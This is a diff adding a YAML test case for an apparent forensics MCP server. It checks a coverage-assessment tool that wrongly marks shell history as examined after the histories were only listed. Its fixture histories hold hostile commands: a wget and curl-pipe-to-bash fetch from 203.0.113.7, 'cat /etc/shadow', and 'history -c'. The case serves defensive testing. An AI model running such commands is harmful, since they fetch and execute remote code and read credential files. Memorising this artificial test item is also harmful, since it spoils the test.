@@ -1,0 +1,53 @@
+# Matrix case P1024-007: assess_coverage counts find_shell_histories, which
+# only lists history files with their size and never reads them, as a tool
+# that examined shell history. After find_shell_histories alone, both history
+# files are "examined" and the verdict is COVERAGE CLEAN.
+# No etc folder is written, so no other artifact class (filesystem root) is
+# inventoried.
+case_id: P1024-007
+problem: P1024
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "`assess_coverage`의 안내 문구가 `find_shell_histories`를 먼저 부르라고 하므로, 그 단계에서 범위를 점검하는 것은 정해진 흐름이다."
+coverage: full
+summary: find_shell_histories lists two .bash_history files by size without their content, and assess_coverage then marks shell history "✅ examined" and returns COVERAGE CLEAN although no history has been read.
+summary_ko: "`find_shell_histories`는 `.bash_history` 두 개를 크기만으로 나열하고 내용은 보이지 않는다. 그런데 이어 부른 `assess_coverage`는 셸 기록을 `✅ examined`로 표시하고 `COVERAGE CLEAN`을 낸다. 어느 기록도 읽지 않았다."
+defect_ko: "이 서버의 `assess_coverage`는 파일을 열지 않고 목록만 내는 `find_shell_histories`도 셸 기록을 조사한 도구로 센다. 기록 내용을 분석한 `analyze_bash_history` 호출만 조사로 세야 한다. 모델은 셸 기록의 공격 명령을 이미 확인했다고 잘못 알고 넘어간다."
+setup_ko: "`root`와 `alice`의 `.bash_history`에 내려받기와 계정 파일 접근 명령을 넣었다. 다른 자료 종류가 잡히지 않게 `etc` 폴더는 두지 않았다."
+fixture:
+  - path: fs/root/.bash_history
+    text: |
+      cd /tmp
+      wget http://203.0.113.7/k.sh -O /tmp/.k.sh
+      chmod +x /tmp/.k.sh && /tmp/.k.sh
+      history -c
+  - path: fs/home/alice/.bash_history
+    text: |
+      ls -la
+      cat /etc/shadow
+      curl -s http://203.0.113.7/x | bash
+steps:
+  - tool: find_shell_histories
+    note_ko: "셸 기록 파일 목록만 얻는다"
+    args:
+      root_path: ${EVIDENCE}/fs
+  - tool: assess_coverage
+    note_ko: "결함 호출: 조사 범위 점검"
+    args: {}
+expect:
+  - step: 1
+    note_ko: "기록 파일 두 개를 찾는다"
+    contains: "Found **2** history file(s)"
+  - step: 1
+    note_ko: "목록에는 기록 내용(내려받기 명령)이 없다"
+    not_contains: "203.0.113.7"
+  - step: 2
+    note_ko: "읽지 않은 두 기록을 검사했다고 표시한다"
+    contains: "| shell history | `fs/home/alice/.bash_history`, `fs/root/.bash_history` | ✅ examined |"
+  - step: 2
+    note_ko: "조사 범위에 빈틈이 없다고 판정한다"
+    contains: "**Verdict: COVERAGE CLEAN**"
